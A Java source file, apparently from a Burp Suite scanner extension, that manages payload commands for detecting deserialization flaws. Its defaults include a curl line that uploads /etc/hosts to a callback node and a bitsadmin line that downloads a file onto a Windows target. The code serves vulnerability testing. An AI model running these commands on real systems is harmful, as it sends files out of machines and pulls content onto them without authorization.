/*
	PayloadCommandFactory.java
	
	v0.4 (7/27/2016)
	
	Maintains a list of Hashtables containing skeleton commands to be run on a target system. Allows users to add their own commands, edit or delete existing commands, and
	rearrange the order in which commands are stored in the List (and therefore testing during an Active Scan). Commands must include an interaction with the Node (currently 
	only HTTP interactions are supported) in order to cause the detection of a vulnerability. Commands can contain hard-coded information (node protocol, node host, node 
	port, node token, etc.), or can be autopopulated during an Active Scan by using the following tokens: [NODEPROTOCOL], [NODEHOST], [NODEPORT], [NODEPATH], [NODETOKEN].
	
	Hashtable keys:
		cmd (command to run)
		os (operating system that command is intended for (if not provided when command is created, this will be automatically set to "Unknown"))
		prot (protocol used to talk back to Node: currently only supports "web" (HTTP not HTTPS))
		upload (whether command will upload a file to the Node (true) or simply access the Node (false))
*/

package burp;

import java.util.Hashtable;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Collections;

public class PayloadCommandFactory {
	//data fields
	private static PayloadCommandFactory cmdFactory = null;
	private ArrayList<Hashtable<String,String>> commands;
	private IBurpExtenderCallbacks callbacks = null;
	
	//constants
	//keys
	private static final String[] HT_KEYS = {"cmd","os","prot","upload"};
	//default settings
	private static final String LINUX_OS = "Linux";
	private static final String WIN_OS = "Windows";
	private static final String LINUX_CURL_PASSWD = "curl -X PUT --data-binary @/etc/hosts [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]&technique=[TECHNIQUE]";
	private static final String WIN_BITSADMIN = "bitsadmin /transfer SuperSerialJob /download /priority high [NODEPROTOCOL]://[NODEHOST]:[NODEPORT][NODEPATH]?token=[NODETOKEN]&write=true&technique=[TECHNIQUE] C:\\Windows\\Temp\\superserial.txt"; //TODO: Add random string to job name (to avoid failed detection due to duplicate job names)
	private static final String LINUX_PING = "ping -c 4 [NODEHOST]"; //not used
	private static final String WIN_PING = "ping -n 4 [NODEHOST]"; //not used
	
	//default constructor: include only Linux curl and Windows bitsadmin commands
	private PayloadCommandFactory() {
		commands = new ArrayList<Hashtable<String,String>>();
		Hashtable<String,String> cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],LINUX_CURL_PASSWD);
		cmd.put(HT_KEYS[1],LINUX_OS);
		cmd.put(HT_KEYS[2],"web");
		cmd.put(HT_KEYS[3],"true");
		commands.add(cmd);
		cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],WIN_BITSADMIN);
		cmd.put(HT_KEYS[1],WIN_OS);
		cmd.put(HT_KEYS[2],"web");
		cmd.put(HT_KEYS[3],"false");
		commands.add(cmd);
	}
	
	//constructor: include only Linux curl and Windows bitsadmin commands, and include IBurpExtenderCallbacks reference (for printing output)
	private PayloadCommandFactory(IBurpExtenderCallbacks cb) {
		commands = new ArrayList<Hashtable<String,String>>();
		Hashtable<String,String> cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],LINUX_CURL_PASSWD);
		cmd.put(HT_KEYS[1],LINUX_OS);
		cmd.put(HT_KEYS[2],"web");
		cmd.put(HT_KEYS[3],"true");
		commands.add(cmd);
		cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],WIN_BITSADMIN);
		cmd.put(HT_KEYS[1],WIN_OS);
		cmd.put(HT_KEYS[2],"web");
		cmd.put(HT_KEYS[3],"false");
		commands.add(cmd);
		
		callbacks = cb;
	}
	
	//get PayloadCommandFactory instance for use elsewhere
	public static PayloadCommandFactory getInstance() {
		if(cmdFactory==null) {
			cmdFactory = new PayloadCommandFactory();
		}
		return cmdFactory;
	}
	
	//get PayloadCommandFactory instance for use elsewhere
	//NOTE: this is only intended to be called in BurpExtender.registerExtenderCallbacks(), so that the IBurpExtenderCallbacks reference can be successfully added
	public static PayloadCommandFactory getInstance(IBurpExtenderCallbacks cb) {
		if(cmdFactory==null) {
			cmdFactory = new PayloadCommandFactory(cb);
		}
		return cmdFactory;
	}
	
	//reset PayloadCommandFactory back to default settings
	public static PayloadCommandFactory resetSettings() {
		cmdFactory = new PayloadCommandFactory();
		return cmdFactory;
	}
	
	//get number of commands currently stored in PayloadCommandFactory
	public int getCommandsCount() {
		return commands.size();
	}
	
	//add custom command to PayloadCommandFactory
	public void add(String c,String o,String p,boolean u) {
		//check for invalid inputs and handle accordingly
		if(c==null) return; //inputted command is null or empty, do not proceed
		else {
			c = c.trim();
			if(c.isEmpty()) return;
		}
		if(o==null) o = "Unknown"; //if inputted OS is null or empty, set to "Unknown"
		else {
			o = o.trim();
			if(o.isEmpty()) o = "Unknown";
		}
		if(p==null) p = "web"; //if inputted protocol is null or empty, set to "web" (for now until more protocols are supported)
		else {
			p = p.trim();
			if(p.isEmpty()) p = "web";
		}
		
		Hashtable<String,String> cmd = new Hashtable<String,String>(3);
		cmd.put(HT_KEYS[0],c);
		cmd.put(HT_KEYS[1],o);
		cmd.put(HT_KEYS[2],p);
		cmd.put(HT_KEYS[3],Boolean.toString(u));
		commands.add(cmd);
	}
	
	//edit command (by index) already stored within PayloadCommandFactory
	public void edit(int index,String c,String o,String p,boolean u) {
		//check for invalid inputs and handle accordingly
		if(index<0 || index>=commands.size()) return; //index is invalid, do not proceed
		if(c==null) return; //inputted command is null or empty, do not proceed
		else {
			c = c.trim();
			if(c.isEmpty()) return;
		}
		if(o==null) o = "Unknown"; //if inputted OS is null or empty, set to "Unknown"
		else {
			o = o.trim();
			if(o.isEmpty()) o = "Unknown";
		}
		if(p==null) p = "web"; //if inputted protocol is null or empty, set to "web" (for now until more protocols are implemented)
		else {
			p = p.trim();
			if(p.isEmpty()) p = "web";
		}
		
		Hashtable<String,String> cmd = commands.get(index);
		String oldC = cmd.get("cmd");
		cmd.put(HT_KEYS[0],c);
		cmd.put(HT_KEYS[1],o);
		cmd.put(HT_KEYS[2],p);
		cmd.put(HT_KEYS[3],Boolean.toString(u));
		commands.set(index,cmd);
	}
	
	//remove command (by index) from PayloadCommandFactory
	public void remove(int index) {
		Hashtable<String,String> c = null;
		try {
			c = commands.remove(index);
		} catch(IndexOutOfBoundsException ioobe) {
			//invalid index provided: do nothing, simply return
		}
	}
	
	//swap command positions (must be sequential)
	public void swap(String topCmd,String bottomCmd) {
		if(topCmd!=null && bottomCmd!=null) {
			topCmd = topCmd.trim();
			bottomCmd = bottomCmd.trim();
			if(topCmd.isEmpty() || bottomCmd.isEmpty()) return;
			
			int topIndex = -1;
			int bottomIndex = -1;
			
			Iterator<Hashtable<String,String>> cmdItr = commands.iterator();
			while(cmdItr.hasNext()) {
				Hashtable<String,String> cmdHT = cmdItr.next();
				if(cmdHT.get(HT_KEYS[0]).equals(topCmd)) {
					topIndex = commands.indexOf(cmdHT);
				} else if(cmdHT.get(HT_KEYS[0]).equals(bottomCmd)) {
					bottomIndex = commands.indexOf(cmdHT);
				}
			}
			
			if((topIndex!=-1) && (bottomIndex!=-1)) {
				if(Math.abs(topIndex-bottomIndex) == 1) { //rows are sequential
					Collections.swap(commands,topIndex,bottomIndex);
				}
			}
		}
	}
	
	//get array of command hashtables
	public Hashtable[] getCommandsArray() {
		Hashtable[] retArr = new Hashtable[commands.size()];
		return commands.toArray(retArr);
	}
}